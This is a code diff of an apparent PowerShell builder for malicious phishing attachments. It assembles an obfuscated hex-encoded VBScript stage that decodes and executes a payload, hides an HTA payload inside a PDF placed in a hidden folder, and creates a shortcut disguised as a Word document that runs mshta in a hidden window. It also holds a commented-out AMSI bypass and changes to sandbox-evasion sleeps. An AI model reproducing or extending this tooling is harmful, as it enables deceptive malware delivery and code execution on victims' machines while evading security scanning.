@@ -249,22 +249,10 @@ function New-FirstStageVBLauncher {
     $exec = ("$contentVar=" + (-join ($splittedPayload | ForEach-Object {" hex($($_.'var1')$($_.'op')$($_.'var2')) &"}))).TrimEnd(" &")
     $vbScript = [System.Collections.Generic.List[string]]::new()
     $vbScript.Add("${assignement}:")
-    if (Get-Random -Minimum 0 -Maximum 2) {
-        $vbScript.Add((Get-RandomSleep -Min 5000 -Max 50000))
-    }
     $vbScript.Add("${exec}:")
-    if (Get-Random -Minimum 0 -Maximum 2) {
-        $vbScript.Add((Get-RandomSleep -Min 5000 -Max 50000))
-    }
     $vbScript.Add("dim $index,${outputvar}:")
-    if (Get-Random -Minimum 0 -Maximum 2) {
-        $vbScript.Add((Get-RandomSleep -Min 5000 -Max 50000))
-    }
     $vbScript.Add("for $index=1 to len($contentVar) step 2:")
     $vbScript.Add("$outputVar = $outputVar & Chr(CLng(`"&H`" & Mid($contentVar, $index, 2))):next:")
-    if (Get-Random -Minimum 0 -Maximum 2) {
-        $vbScript.Add((Get-RandomSleep -Min 5000 -Max 50000))
-    }
     $vbScript.Add("execute($outputvar):self.close")
     @"
 <html>
@@ -411,6 +399,23 @@ function New-LnkFile {
        [string] $Dest,
        [int] $IconNumber,
        [string] $Target,
+       [string] $Arguments = ""
+    )
+    $shell = New-Object -ComObject WScript.Shell
+    $lnk = $shell.CreateShortcut("$Dest.lnk")
+    $lnk.TargetPath = $Target
+    $lnk.Description = "Microsoft Word Document"
+    $lnk.WindowStyle = 7 # hidden
+    $lnk.Arguments = $Arguments
+    $lnk.IconLocation = "%systemroot%\system32\imageres.dll,$IconNumber"
+    $lnk.Save()
+}
+
+function New-LnkFile-Mshta {
+    param (
+       [string] $Dest,
+       [int] $IconNumber,
+       [string] $Target,
        [switch] $Wmic
     )
     $shell = New-Object -ComObject WScript.Shell
@@ -424,20 +429,32 @@ function New-LnkFile {
     else {
         "%comspec% /c $mshtaCmd"
     }
-    $lnk.Arguments = "/M $Target /C `"$cmd`""
+    $lnk.Arguments = "/M $Target /S /C `"$cmd`""
     $lnk.IconLocation = "%systemroot%\system32\imageres.dll,$IconNumber"
     $lnk.Save()
+}
+
+function New-HiddenDirectory {
+    param (
+        [string] $Path
+    )
+    $hiddenDir = New-Item -ItemType Directory $Path 
+    $hiddenDir.Attributes = $hiddenDir.Attributes -bor [System.IO.FileAttributes]::Hidden   
 }
 
 #$amsi = "[Ref]." + (New-ObfuscatedCommand "('Assembly').('GetType')") + "('System.Management.Automation.AmsiUtils')." + (New-ObfuscatedCommand "('GetField')")+"('amsiInitFailed','NonPublic,Static')"+ (New-ObfuscatedCommand ".('SetValue')(`$null,`$true)")
 #Write-Output $amsi
 $psLauncher = New-PowershellLauncher -Payload $payload
-$secondStage = New-SecondStageVBLauncher -Payload $psLauncher
+$secondStage = New-SecondStageVBLauncher -Payload "Invoke-Item $Env:windir ; $psLauncher;"
 $vbPayload = New-FirstStageVBLauncher -Payload $secondStage
 
 
 if (!(Test-Path -Path $destDir -PathType Container)){
     New-Item -ItemType Directory $destDir
+    New-HiddenDirectory -Path "$($destDir)\_" 
 }
-New-InsertHtaToPDF -OriginalPdf $origninalPdf -HtaPayload $vbPayload -Dest "$($destDir)\$($pdfFileName)"
-New-LnkFile -Target $pdfFileName -Dest "$($destDir)\$($lnkFileName)" -IconNumber 340
+elseif (!(Test-Path -Path "$($destDir)\_" -PathType Container)){
+    New-HiddenDirectory -Path "$($destDir)\_" 
+}
+New-InsertHtaToPDF -OriginalPdf $origninalPdf -HtaPayload $vbPayload -Dest "$destDir\_\$pdfFileName"
+New-LnkFile-Mshta -Target $pdfFileName -Dest "$destDir\$lnkFileName" -IconNumber 5
